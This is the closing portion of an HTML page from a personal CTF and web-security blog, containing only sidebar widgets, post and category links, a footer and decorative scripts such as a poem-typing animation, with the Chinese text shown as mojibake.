            var jrsc_plac =  result.data.content + "\nã€Œ" + result.data.origin.title + "ã€" + result.data.origin.dynasty + " Â· " + result.data.origin.author;
            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
        })
    </script>

<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>

    
</article>

        

            </section>

        

        <script src="./js/src/Valine.min.js"></script>   
        
        
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- æ–‡ç« å’Œé¡µé¢æ ¹æ®splitteræ¥åˆ†å‰²ï¼Œæ²¡æœ‰çš„è¯å°±ä»å¤´å¼€å§‹è®¾ç½®ä¸ºsticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                æ–‡ç« 
            </span>
            <span class="count">
                69
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                åˆ†ç±»
            </span>
            <span class="count">
                11
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                æ ‡ç­¾
            </span>
            <span class="count">
                14
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>åˆ†ç±»ç›®å½•</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">ä¸åŠ¡æ­£ä¸šç³»åˆ—</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">åŸºç¡€æ¼æ´</a><span class="category-list-count">15</span></li></ul>
  </aside>


            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>æ ‡ç­¾èšåˆ</h4>
      <div class="tag-clouds">
        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.67em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.67em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.7em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.63em;">awd</a> <a href="/tags/java/" style="font-size: 0.73em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">ä¸åŠ¡æ­£ä¸š</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">åŸºç¡€æ¼æ´</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">æ‚é¡¹</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.63em;">æ¸—é€</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>æœ€æ–°æ–‡ç« </h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/posts/52077.html"><i class="fa  fa-book"></i> dasctfæš‘æœŸæŒ‘æˆ˜èµ›easyjobå¤ç°</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/35553.html"><i class="fa  fa-book"></i> CISCN ezjavaå¦è§£</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/58452.html"><i class="fa  fa-book"></i> åšå®¢å¤æ´»æµ‹è¯•</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/50456.html"><i class="fa  fa-book"></i> CISCN2024 åå—åˆ†åŒºèµ› awd</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/12279.html"><i class="fa  fa-book"></i> è¢«awdé€Ÿé€š(2)</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>

        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  class="ap-lrc"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
                        
                        
                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
                        
                        
                        
                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2024 Err0r233 ç‰ˆæƒæ‰€æœ‰.</li>
                            <li>æœ¬ç«™å·²è¿è¡Œ<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                        <div id="binft"></div>
  <script>
    var binft = function (r) {
      function t() {
        return b[Math.floor(Math.random() * b.length)]
      }  
      function e() {
        return String.fromCharCode(94 * Math.random() + 33)
      }
      function n(r) {
        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
          var l = document.createElement("span");
          l.textContent = e(), l.style.color = t(), n.appendChild(l)
        }
        return n
      }
      function i() {
        var t = o[c.skillI];
        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
      }
      var l = "",
      o = ["é’é’é™µä¸ŠæŸï¼Œç£Šç£Šæ¶§ä¸­çŸ³ã€‚", "äººç”Ÿå¤©åœ°é—´ï¼Œå¿½å¦‚è¿œè¡Œå®¢ã€‚","æ–—é…’ç›¸å¨±ä¹ï¼ŒèŠåšä¸ä¸ºè–„ã€‚", "é©±è½¦ç­–é©½é©¬ï¼Œæ¸¸æˆå®›ä¸æ´›ã€‚","æ´›ä¸­ä½•éƒéƒï¼Œå† å¸¦è‡ªç›¸ç´¢ã€‚","é•¿è¡¢ç½—å¤¹å··ï¼Œç‹ä¾¯å¤šç¬¬å®…ã€‚","ä¸¤å®«é¥ç›¸æœ›ï¼ŒåŒé˜™ç™¾ä½™å°ºã€‚","æå®´å¨±å¿ƒæ„ï¼Œæˆšæˆšä½•æ‰€è¿«ï¼Ÿ"].map(function (r) {
      return r + ""
      }),
      a = 2,
      g = 1,
      s = 5,
      d = 75,
      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
      c = {
        text: "",
        prefixP: -s,
        skillI: 0,
        skillP: 0,
        direction: "forward",
        delay: a,
        step: g
      };
      i()
      };
      binft(document.getElementById('binft'));
  </script>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>


        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>

    <div>
        <canvas id="snow"></canvas>
        <script async src="/js/snow.min.js"></script>
    </div>


    <script async src="/js/candy.min.js"></script>



    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
    <meting-js
        server="netease"
        type="playlist"
        id="7733928587"
        order="random"
        fixed="true"
    >
    </meting-js>



    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>

    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>



<!-- Extra support for third-party plguins  -->



    </body>
</html>